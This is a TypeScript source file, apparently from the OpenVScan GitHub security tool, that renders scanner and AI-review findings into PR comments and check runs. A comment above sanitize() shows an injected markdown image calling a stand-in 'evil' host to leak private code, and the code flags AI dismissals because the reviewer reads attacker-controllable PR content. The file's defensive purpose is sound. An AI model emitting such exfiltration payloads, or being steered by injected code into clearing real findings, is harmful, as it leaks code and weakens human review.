import {
  AGENT_INFO,
  type AgentProvider,
  type AiVerdict,
  type Conclusion,
  countBySeverity,
  type FailThreshold,
  type FindingSource,
  isBlocking,
  isDismissed,
  isOverruled,
  isRelevant,
  meetsThreshold,
  SCANNER_INFO,
  SEVERITIES,
  type Severity,
  type SeverityCounts,
  severityRank,
} from "@openvscan/core";
import type { CheckAnnotation, ReviewComment } from "@openvscan/github";
import { commentLine, type DiffMap } from "./diff";

/** A stored finding as the publisher sees it. */
export interface ReportFinding {
  id: string;
  source: FindingSource;
  ruleId: string | null;
  title: string;
  description: string;
  severity: Severity;
  filePath: string | null;
  startLine: number | null;
  endLine: number | null;
  inDiff: boolean;
  cwe: string | null;
  remediation: string | null;
  suggestion: string | null;
  fingerprint: string;
  aiVerdict: AiVerdict | null;
  aiReasoning: string | null;
}

export interface ReportContext {
  isPr: boolean;
  failOn: FailThreshold;
  /** The run's dashboard page. */
  runUrl: string;
  repoFullName: string;
  headSha: string;
  agent: string | null;
  aiSummary: string | null;
  aiRisk: string | null;
  aiError: string | null;
  /** Why the AI step was deliberately not run, if so. */
  aiSkipped?: string | null;
  scannerErrors: string[];
}

const EMOJI: Record<Severity, string> = {
  critical: "🔴",
  high: "🟠",
  medium: "🟡",
  low: "🔵",
  info: "⚪",
};

const SOURCE_LABEL: Record<FindingSource, string> = {
  trivy: SCANNER_INFO.trivy.label,
  opengrep: SCANNER_INFO.opengrep.label,
  gitleaks: SCANNER_INFO.gitleaks.label,
  ai: "AI review",
};

/**
 * Neutralise text that came from scanners / the agent (both derived from
 * attacker-controllable code) before it's rendered on GitHub:
 * - no @mention pings, no forged copies of our hidden marker, no raw HTML;
 * - no markdown images or links: GitHub fetches image URLs when the comment
 *   is viewed, so an injected `![](https://evil/?d=<private code>)` would
 *   leak the repository. Brackets are escaped, so nothing renders as a link;
 * - no bare URLs or issue references (`#12`, `owner/repo#12`, `GH-12`),
 *   which GitHub links and turns into cross-references in other repos.
 * A zero-width space breaks each autolink while the text still reads the same.
 */
export function sanitize(s: string, max = 2000): string {
  const t = s
    .replace(/<!--|-->/g, "")
    .replace(/<\/?[a-z][^>]*>/gi, "")
    .replace(/@(?=[A-Za-z0-9-])/g, "@\u200b")
    .replace(/[[\]]/g, "\\$&")
    .replace(/\b(https?):\/\//gi, "$1:\u200b//")
    .replace(/\bwww\./gi, "www\u200b.")
    .replace(/#(?=\d)/g, "#\u200b")
    .replace(/\bGH-(?=\d)/gi, "GH\u200b-")
    .trim();
  return t.length > max ? `${t.slice(0, max - 1)}…` : t;
}

const code = (s: string) => `\`${s.replace(/`/g, "'")}\``;

/** Findings that count: not dismissed by the AI, and (for PRs) in the diff. */
function relevant(findings: ReportFinding[], isPr: boolean): ReportFinding[] {
  return findings.filter((f) => isRelevant(f, isPr));
}

export function decideConclusion(
  findings: ReportFinding[],
  ctx: Pick<ReportContext, "isPr" | "failOn">,
): Conclusion {
  if (ctx.failOn === "never") return "neutral";
  if (findings.some((f) => isBlocking(f, ctx))) return "fail";
  // The AI cleared something that would have blocked: don't go green.
  return findings.some((f) => isOverruled(f, ctx)) ? "neutral" : "pass";
}

function sortFindings(findings: ReportFinding[]): ReportFinding[] {
  return [...findings].sort(
    (a, b) =>
      severityRank(a.severity) - severityRank(b.severity) ||
      Number(b.inDiff) - Number(a.inDiff) ||
      (a.filePath ?? "").localeCompare(b.filePath ?? "") ||
      (a.startLine ?? 0) - (b.startLine ?? 0),
  );
}

function countsLine(c: SeverityCounts): string {
  const parts = SEVERITIES.filter((s) => c[s] > 0).map((s) => `${EMOJI[s]} ${c[s]} ${s}`);
  return parts.length ? parts.join(" · ") : "no findings";
}

function location(f: ReportFinding): string {
  if (!f.filePath) return "—";
  return code(f.startLine ? `${f.filePath}:${f.startLine}` : f.filePath);
}

function findingsTable(rows: ReportFinding[], limit: number): string {
  const top = rows.slice(0, limit);
  const body = top
    .map(
      (f) =>
        `| ${EMOJI[f.severity]} ${f.severity} | ${sanitize(f.title, 140).replace(/\|/g, "\\|").replace(/\n/g, " ")} | ${SOURCE_LABEL[f.source]}${f.aiVerdict === "confirmed" ? " ✓" : ""} | ${location(f)} |`,
    )
    .join("\n");
  return [
    "| Severity | Finding | Source | Location |",
    "| --- | --- | --- | --- |",
    body,
    rows.length > limit ? `\n_…and ${rows.length - limit} more in the dashboard._` : "",
  ].join("\n");
}

function headline(
  conclusion: Conclusion,
  rel: ReportFinding[],
  overruled: number,
  ctx: ReportContext,
): string {
  if (conclusion === "fail") {
    const n = rel.filter((f) => isBlocking(f, ctx)).length;
    return `❌ ${n} blocking issue${n === 1 ? "" : "s"} (severity ≥ ${ctx.failOn})`;
  }
  if (overruled > 0) {
    return `⚠️ ${overruled} finding${overruled === 1 ? "" : "s"} at severity ≥ ${ctx.failOn} dismissed by the AI: check before merging`;
  }
  if (rel.length === 0) return "✅ No security issues found";
  return conclusion === "neutral"
    ? `ℹ️ ${rel.length} finding${rel.length === 1 ? "" : "s"} (advisory)`
    : `✅ No blocking issues · ${rel.length} lower-severity finding${rel.length === 1 ? "" : "s"}`;
}

function aiBlock(ctx: ReportContext): string {
  if (ctx.aiSummary) {
    return `#### 🤖 AI review${ctx.aiRisk ? ` · risk: **${ctx.aiRisk}**` : ""}\n\n${sanitize(ctx.aiSummary, 3000)}`;
  }
  if (ctx.aiError) return `> ⚠️ AI review did not complete: ${sanitize(ctx.aiError, 300)}`;
  if (ctx.aiSkipped) return `> ℹ️ ${sanitize(ctx.aiSkipped, 400)}`;
  if (!ctx.agent) {
    return "> 💡 Enable the AI reviewer (Claude Code or Codex, with your own subscription) in the repository settings to triage scanner noise and catch logic flaws.";
  }
  return "";
}

function stats(findings: ReportFinding[], ctx: ReportContext) {
  const rel = sortFindings(relevant(findings, ctx.isPr));
  const dismissed = findings.filter(isDismissed).length;
  const existing = ctx.isPr ? findings.filter((f) => !f.inDiff && !isDismissed(f)).length : 0;
  const overruled = findings.filter((f) => isOverruled(f, ctx)).length;
  return { rel, dismissed, existing, overruled, counts: countBySeverity(rel) };
}

/** Body of the sticky PR summary comment. */
export function buildSummaryComment(
  findings: ReportFinding[],
  conclusion: Conclusion,
  ctx: ReportContext,
): string {
  const { rel, dismissed, existing, overruled, counts } = stats(findings, ctx);
  const lines = [
    `## 🛡️ OpenVScan · ${headline(conclusion, rel, overruled, ctx)}`,
    "",
    `Reviewed ${code(ctx.headSha.slice(0, 7))} · ${countsLine(counts)}`,
    "",
    aiBlock(ctx),
    "",
  ];
  if (rel.length) lines.push(findingsTable(rel, 15), "");
  if (overruled) {
    const rows = sortFindings(findings.filter((f) => isOverruled(f, ctx)));
    lines.push(
      "#### ⚠️ Dismissed by the AI, would otherwise block",
      "",
      "The AI judged these false positives. It reads code from the pull request, so confirm before merging.",
      "",
      findingsTable(rows, 10),
      "",
    );
  }
  const notes: string[] = [];
  if (dismissed) notes.push(`🧹 ${dismissed} scanner finding${dismissed === 1 ? "" : "s"} dismissed by the AI as false positives`);
  if (existing) notes.push(`📦 ${existing} pre-existing finding${existing === 1 ? "" : "s"} outside this diff`);
  if (ctx.scannerErrors.length) notes.push(`⚠️ ${ctx.scannerErrors.map((e) => sanitize(e, 120)).join("; ")}`);
  if (notes.length) lines.push(notes.map((n) => `- ${n}`).join("\n"), "");
  lines.push(
    `[View full report →](${ctx.runUrl})`,
    "",
    `<sub>Scanners: Trivy · Opengrep · Gitleaks${ctx.agent ? ` · AI: ${AGENT_INFO[ctx.agent as AgentProvider].label}` : ""}. Re-run from the Checks tab or the dashboard.</sub>`,
  );
  return lines.filter((l, i, a) => !(l === "" && a[i - 1] === "")).join("\n");
}

/** Check Run output (title + summary + text). */
export function buildCheckOutput(
  findings: ReportFinding[],
  conclusion: Conclusion,
  ctx: ReportContext,
): { title: string; summary: string; text: string } {
  const { rel, dismissed, existing, overruled, counts } = stats(findings, ctx);
  const title = headline(conclusion, rel, overruled, ctx).replace(/^\S+\s/, "");
  const summary = [
    countsLine(counts),
    dismissed ? `${dismissed} dismissed as false positives by the AI.` : "",
    existing ? `${existing} pre-existing findings outside the diff (not gating).` : "",
    "",
    aiBlock(ctx),
    "",
    `[Open in OpenVScan](${ctx.runUrl})`,
  ]
    .filter((l, i, a) => !(l === "" && a[i - 1] === ""))
    .join("\n");
  const text = rel.length ? findingsTable(rel, 50) : "";
  return { title, summary, text };
}

/** Line annotations on the Check Run (relevant findings that have a line). */
export function buildAnnotations(findings: ReportFinding[], ctx: ReportContext): CheckAnnotation[] {
  return sortFindings(relevant(findings, ctx.isPr))
    .filter((f) => f.filePath && f.startLine)
    .slice(0, 200)
    .map((f) => ({
      path: f.filePath as string,
      start_line: f.startLine as number,
      end_line: f.endLine && f.endLine >= (f.startLine as number) ? f.endLine : (f.startLine as number),
      annotation_level: meetsThreshold(f.severity, ctx.failOn)
        ? "failure"
        : severityRank(f.severity) <= severityRank("medium")
          ? "warning"
          : "notice",
      title: `${f.severity.toUpperCase()} · ${SOURCE_LABEL[f.source]}: ${sanitize(f.title, 200)}`,
      message: sanitize(
        [f.description, f.aiReasoning ? `AI: ${f.aiReasoning}` : "", f.remediation ? `Fix: ${f.remediation}` : ""]
          .filter(Boolean)
          .join("\n\n"),
        3000,
      ),
    }));
}

/**
 * Inline review comments for in-diff findings on commentable lines.
 * `alreadyCommented` holds fingerprints commented by earlier runs of the same
 * PR, so a new push doesn't repost the same remarks.
 */
export function buildInlineComments(
  findings: ReportFinding[],
  diff: DiffMap | null,
  alreadyCommented: Set<string>,
  limit = 25,
): { comments: ReviewComment[]; fingerprints: string[] } {
  const comments: ReviewComment[] = [];
  const fingerprints: string[] = [];
  for (const f of sortFindings(relevant(findings, true))) {
    if (comments.length >= limit) break;
    if (severityRank(f.severity) > severityRank("low")) continue; // skip info
    if (alreadyCommented.has(f.fingerprint)) continue;
    const at = commentLine(diff, f.filePath, f.startLine, f.endLine);
    if (!at) continue;

    const parts = [
      `**${EMOJI[f.severity]} ${f.severity[0].toUpperCase()}${f.severity.slice(1)} · ${SOURCE_LABEL[f.source]}** — ${sanitize(f.title, 200)}`,
      "",
      sanitize(f.description, 1500),
    ];
    if (f.aiVerdict && f.source !== "ai") {
      parts.push("", `_AI triage: **${f.aiVerdict.replace("_", " ")}**${f.aiReasoning ? ` — ${sanitize(f.aiReasoning, 600)}` : ""}_`);
    }
    if (f.remediation) parts.push("", `**Fix:** ${sanitize(f.remediation, 800)}`);
    // Only offer a one-click suggestion when it replaces exactly the
    // commented range.
    const exact =
      f.suggestion &&
      at.line === (f.endLine ?? f.startLine) &&
      (at.startLine ?? at.line) === f.startLine;
    if (exact && f.suggestion) parts.push("", "```suggestion", f.suggestion.replace(/```/g, "ˋˋˋ"), "```");
    parts.push("", `<sub>${[f.ruleId, f.cwe].filter(Boolean).map((s) => code(String(s))).join(" · ")}</sub>`);

    comments.push({
      path: f.filePath as string,
      line: at.line,
      start_line: at.startLine,
      body: parts.join("\n"),
    });
    fingerprints.push(f.fingerprint);
  }
  return { comments, fingerprints };
}
